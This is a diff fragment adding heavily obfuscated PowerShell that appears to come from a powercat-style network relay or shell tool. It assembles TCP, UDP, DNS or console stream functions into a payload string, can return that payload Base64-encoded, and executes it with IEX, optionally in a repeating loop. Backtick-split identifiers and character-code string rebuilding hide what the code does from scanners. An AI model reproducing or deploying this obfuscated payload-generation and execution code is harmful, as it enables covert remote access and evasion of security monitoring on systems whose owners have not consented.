+      ${FU`N`CtioN`stRiNG} += ("function Stream2_WriteData`n{`n" + ${function:WriteData_UDP} + "`n}`n`n")
+      ${F`UnctI`oNstrINg} += ("function Stream2_Close`n{`n" + ${function:Close_UDP} + "`n}`n`n")    
+      if(${R}."s`pLIT"(":")."C`OuNT" -eq 2){${I`NvOk`e`stRinG} += ("@('',`$True,'" + ${r}."S`PLiT"(":")[1] + ("','$t') "+''))}
+      elseif(${r}."S`PLIT"(":")."cOu`Nt" -eq 3){${i`NV`O`kEsTri`NG} += (((('@(mu'+'E')-cREpLAce 'muE',[chAr]39)) + ${R}."spl`iT"(":")[1] + "',`$False,'" + ${R}."Sp`LiT"(":")[2] + ("','$t') "+''))}
+      else{return ('Bad'+' r'+'ela'+'y'+' fo'+'rmat.')}
+    }
+    if(${r}."sP`Lit"(":")[0]."TOl`Ow`ER"() -eq ('d'+'ns'))
+    {
+      &('Write'+'-'+'Verb'+'ose') ('Set St'+'ream'+' 2'+': '+'DNS')
+      ${FU`NcTio`NStrI`Ng} += ("function Stream2_Setup`n{`n" + ${function:Setup_DNS} + "`n}`n`n")
+      ${fU`NC`TIonSTr`iNg} += ("function Stream2_ReadData`n{`n" + ${function:ReadData_DNS} + "`n}`n`n")
+      ${fUN`CTiOnsTR`INg} += ("function Stream2_WriteData`n{`n" + ${function:WriteData_DNS} + "`n}`n`n")
+      ${fUncT`ION`st`RInG} += ("function Stream2_Close`n{`n" + ${function:Close_DNS} + "`n}`n`n")
+      if(${r}."SPl`iT"(":")."CoU`NT" -eq 2){return ('T'+'hi'+'s feat'+'u'+'re is not availa'+'ble.')}
+      elseif(${R}."s`PLIT"(":")."C`ounT" -eq 4){${i`N`VokESTr`I`Ng} += (((('@(c'+'2I')  -crePlAcE'c2I',[CHAr]39)) + ${R}."SPL`IT"(":")[1] + (('oF'+'9,'+'oF9')."r`EPl`AcE"('oF9',[strINg][CHAr]39)) + ${r}."Sp`liT"(":")[2] + (('6'+'mh,6mh')."re`place"(([cHar]54+[cHar]109+[cHar]104),[sTRInG][cHar]39)) + ${r}."Spl`iT"(":")[3] + ("',$dnsft) "+''))}
+      else{return ('Ba'+'d rela'+'y form'+'at.')}
+    }
+    elseif(${r}."SpL`iT"(":")[0]."TOLo`w`Er"() -eq ('t'+'cp'))
+    {
+      &('Wr'+'ite-'+'Verbose') ('Set'+' Str'+'e'+'am'+' 2: TCP')
+      ${fUnc`T`I`Onst`RiNG} += ("function Stream2_Setup`n{`n" + ${function:Setup_TCP} + "`n}`n`n")
+      ${F`UNcTIO`Nst`Ring} += ("function Stream2_ReadData`n{`n" + ${function:ReadData_TCP} + "`n}`n`n")
+      ${f`UNC`Ti`o`NstRIng} += ("function Stream2_WriteData`n{`n" + ${function:WriteData_TCP} + "`n}`n`n")
+      ${fu`Nct`I`onSTrinG} += ("function Stream2_Close`n{`n" + ${function:Close_TCP} + "`n}`n`n")
+      if(${R}."s`pLIt"(":")."Cou`Nt" -eq 2){${iN`Vok`esTring} += ("@('',`$True,'" + ${r}."s`PlIt"(":")[1] + ("','$t') "+''))}
+      elseif(${r}."Sp`Lit"(":")."CO`UNT" -eq 3){${InvOK`esT`RiNG} += ((('@(DV'+'W')."REPL`Ace"(([cHAr]68+[cHAr]86+[cHAr]87),[STring][cHAr]39)) + ${r}."S`PLiT"(":")[1] + "',`$False,'" + ${r}."SPl`It"(":")[2] + ("','$t') "+''))}
+      else{return ('Bad '+'r'+'elay '+'form'+'at.')}
+    }
+  }
+  else
+  {
+    &('Wri'+'te-Verb'+'o'+'se') ('Set St'+'r'+'eam 2: Co'+'n'+'sol'+'e')
+    ${fUnCTIO`N`STr`I`Ng} += ("function Stream2_Setup`n{`n" + ${function:Setup_Console} + "`n}`n`n")
+    ${F`U`NctIonstRI`NG} += ("function Stream2_ReadData`n{`n" + ${function:ReadData_Console} + "`n}`n`n")
+    ${Fu`N`c`TiOnsTring} += ("function Stream2_WriteData`n{`n" + ${function:WriteData_Console} + "`n}`n`n")
+    ${fuNctI`OnS`TR`iNg} += ("function Stream2_Close`n{`n" + ${function:Close_Console} + "`n}`n`n")
+    ${InvokE`sTri`NG} += (((('@(Ht'+'f')-ReplaCe ([Char]72+[Char]116+[Char]102),[Char]39)) + ${O} + ((('98N'+')')  -crePLAcE '98N',[CHar]39)))
+  }
+  
+  if(${e`P}){${Fu`N`CtIoNstring} += ("function Main`n{`n" + ${function:Main_Powershell} + "`n}`n`n")}
+  else{${f`UnctIonS`TriNg} += ("function Main`n{`n" + ${function:Main} + "`n}`n`n")}
+  ${i`Nv`OK`ESTRiNg} = (${FuN`C`TionstRi`Ng} + ${InVoke`ST`RI`Ng})
+  
+  
+  
+  if(${gE}){&('Wri'+'te-'+'Verbos'+'e') ('Returnin'+'g'+' Encoded'+' '+'Payl'+'oad...') ; return [Convert]::"TObaSe`64STR`ING"([System.Text.Encoding]::"UnI`c`oDe"."gEt`BYT`es"(${I`NvO`kE`StRING}))}
+  elseif(${g}){&('Write-Ve'+'rb'+'ose') ('Retur'+'ning '+'Pa'+'yl'+'oad..'+'.') ; return ${INvoKeSt`R`I`NG}}
+  
+  
+  
+  ${O`U`TPUT} = ${n`ULl}
+  try
+  {
+    if(${R`eP})
+    {
+      while(${T`RUE})
+      {
+        ${OUt`puT} += &('I'+'EX') ${invoke`sT`RI`NG}
+        &('S'+'tart-S'+'leep') -s 2
+        &('Write-'+'Verb'+'ose') ('Re'+'petiti'+'on'+' Enabl'+'ed: Re'+'starting.'+'..')
+      }
+    }
+    else
+    {
+      ${ouT`P`UT} += &('I'+'EX') ${iNvo`kE`STr`ING}
+    }
+  }
+  finally
+  {
+    if(${O`UTpuT} -ne ${N`Ull})
+    {
+      if(${OF} -eq ""){${ou`T`PUT}}
+      else{[io.file]::"W`RiTEALLB`yTeS"(${Of},${Ou`Tp`Ut})}
+    }
+  }
+  
+}
+
